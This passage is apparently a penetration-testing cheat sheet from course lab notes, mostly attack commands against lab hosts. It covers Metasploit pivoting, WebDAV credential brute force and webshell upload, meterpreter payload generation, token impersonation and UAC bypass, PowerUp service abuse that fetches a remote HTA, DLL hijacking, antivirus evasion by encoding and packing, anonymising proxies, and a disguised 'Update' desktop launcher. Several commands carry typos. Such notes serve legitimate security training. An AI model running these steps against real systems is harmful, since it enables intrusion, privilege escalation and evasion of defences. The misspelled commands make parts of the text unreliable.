proxychains ssh administrator@demo1.ine.local
OR
msf > use exploit/windows/smb/psexec
msf > set payload windows/meterpreter/blind_tcp
OR
msf > use exploit/windows/smb/psexec
msf > set payload windows/meterpreter/reverse_tcp      # Double pivoting
msf > set LHOST host1

```


**Blind Penetration Test**
```
# Target - demo.ine.local
# User/Pass Wordlists Path - /usr/share/metasploit-framework/data/wordlist/
# WebShell Path - /usr/share/webshells/


# Scan Host
nmap -sS -sV demo.ine.local

# Run dirb to find "Webdav" Directory
dirb http://demo.ine.local

# Brute force "Webdav" directory and get credentials
hydra -L common_users.txt -P unix_passwords.txt demo.ine.local http-get /webdav

# Run davtest tool to check if file upload/execute is possible on "Webdav"
davtest -url http://demo.ine.local/webdav -auth administrator:tigger

# Upload webshell.asp to get backdoor swhell on /webdav/webshell.asp
davtest -url http://demo.ine.local/webdav -auth administrator:tigger  -uploadfile webshell.asp -uploadloc /

# Generate meterpreter payload
msfvemom -p /windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > payload.exe

# Upload meterpreter payload to webdav directory
davtest -url http://demo.ine.local/webdav -auth administrator:tigger  -uploadfile payload.exe -uploadloc /

# Locate and execute payload.exe through webshell.asp backdoor
C:\inetpub\wwwroot\webdav\payload.exe

# Run Multi/Handler listener and gain meterpreter shell
meterpreter > use exploit/multi/hanlder

# Privilege Escalation
meterpreter > run post/windows/gather/win_privs     # SeImpersonatePrivilage
meterpreter > migrate -N w3wp.exe                   # Migrate to w3wp.exe
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token DOTNETGOAT\\Administrator
meterpreter > getuid
meterpreter > getsystem

```


**Privilege Escalation**
```
# Scan Host
nmap -sS -sV demo.ine.local

# Httpfileserver 2.3.x is used, so exploit it with meterpreter
msf > exploit/windows/http/rejetto_hfs_exec

# Check privilege escalation exploits. UACbypass exploits are presented
meterpreter > run post/multi/recon/local_exploit_suggester

# Get Administrator rights with metasploit
msf > use exploit/windows/local/bypassuac_dotnet_profiler
meterpreter > getsystem

# OR get administrator rights with UACME
meterpreter > upload Akagi64.exe .
meterpreter > upload msfpayload.exe
shell > Akagi64.exe 23 C:\\msfpayload.exe

msf > use exploit/multi/handler
meterpreter > getsystem

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o msfpayload.exe 

```

**Privilege Escalation Via Services**
```
# Scan Host
nmap -sS -sV demo.ine.local

# BadBlue httpd 2.7is used, so exploit it with meterpreter
msf > exploit/windows/http/badblue_passthru

# Upload PowerSploit and run Invoke-AllChecks to locate vulnerable services
shell > Import-Module .\PowerUp.ps1
shell > Invoke-AllChecks

# Abuse vulnerable service to gain Administrator rights
shell > Invoke-ServiceAbuse -Name AppReadiness 
shell > Invoke-ServiceAbuse -Name AppReadiness -UserName "test\user"
shell > Invoke-ServiceAbuse -Name AppReadiness -Command "Add user to adm"


# Run Psexec with NT\AUTHORITY user
$ Impacket-Psexec test\user@demo.ine.local
OR
msf > use exploit/windows/smb/psexec


# OR Run hta server and exploit through service
msf > use exploit/windows/misc/hta_server
msf > exploit

shell > Invoke-ServiceAbuse -Name AppReadiness  -Command "mshta.exe http://10.10.15.3:8080/ljUAsN.hta"




References:
https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/
https://cheats.philkeeble.com/windows/local-privilege-escalation

```

**Finding and Exploiting DLL Hijacking Vulnerabilities**
```
# Run Process Monitor with following filters
Result.      > contains > NAME NOT FOUND
Path         > end with > .dll
Process Name > is       > dvta.exe

# Check that DWrite.dll and VERSION.dll are missed payload (NAME NOT FOUND) which located directory where attacker have WRITE access.

# Generate msfvenom payload and upload to directory
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o DWrite.dll

$ python3 -m http.server 80

# Upload file to Missed Directory and re run dvta.exe file to gain Administrator Rights.



References:
https://notchxor.github.io/oscp-notes/4-win-privesc/6-dll-hijacking/

```


**Bypassing AV**
```
# Veil-Framework - Generate Payload
Use Evaseion
Use python/meterpreter/rev_tcp.py
generate

# Msfvenom - Generate Payload 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe   -e x86/shikata_ga_nai -i 9 -o payload.exe


# UPX - Compress files to Bypass AV
$ upx --best --ultra-brute payload.exe


# Upload file and run

NOTE:  Msfvenom payloads does not work in that case

```

## Anonymous


**HTTP Proxies**
```
# Tests
https://hide.me/en/proxy

# Proxy lists
https://hidemy.name/en/proxy-list/

# Anonymous Tools
http://www.all-nettools.com/
https://centralops.net/co/
http://do-know.com/privacy-test.html
https://pentest-tools.com/


# TOR
https://www.torproject.org/ 

NOTE : TOR only works for TCP streams and can be used by any application with SOCKS support
```

**HTTP_VIA / HTTP_X_FORWRDED_FOR**
```
# Standart HTTP Communication string
REMOTE_ADDR = 98.10.50.155              # Target IP 
HTTP_ACCEPT_LANGUAGE = en
HTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)
HTTP_HOST = www.elearnsecurity.com
HTTP_VIA = not determined
HTTP_X_FORWARD = not determined

# Proxy Communication String
REMOTE_ADDR = 94.86.100.1               # Proxy IP
HTTP_ACCEPT_LANGUAGE = en
HTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)
HTTP_HOST = www.elearnsecurity.com
HTTP_VIA = 94.86.100.1 (Squid/5.4.STABLE7)    # Proxy IP
HTTP_X_FORWARD = 98.10.50.155                 # Target IP

# High Anonymity Proxy Communication String
REMOTE_ADDR = 94.86.100.1                     # Proxy IP
HTTP_ACCEPT_LANGUAGE = en
HTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)
HTTP_HOST = www.elearnsecurity.com
HTTP_VIA = not determined
HTTP_X_FORWARD = not determined
```



**Tunneling For Anonymity**
```
# There are specifically 2 effective types for anonymity: SSH and IPSEC VPNs

# Local Port Forwarding Through SSH
ssh -L [LOCAL PORT TO LISTEN ON]:[REMOTE MACHINE]:[REMOTE PORT] [USERNAME]@[SSHSERVER]

# Create a tunnel from our local port 3000, to the localhost address on the SSH server, on port 3306
ssh -L 3000:localhost:3306 els@192.168.231.135

``` 

## Social Engineering

```
# Setoolkit Tool
https://github.com/trustedsec/social-engineer-toolkit
```

**Linux test.deskstop**
```
[Desktop Entry]
Type=Application
Name=Update
Exec=/bin/bash ls -la
Icon=/usr/share/yelp-xsl/xslt/common/icons/yelp-note-important.svg
```

[Linux test.desktop generator](https://github.com/password-reset/LinDrop/tree/master)
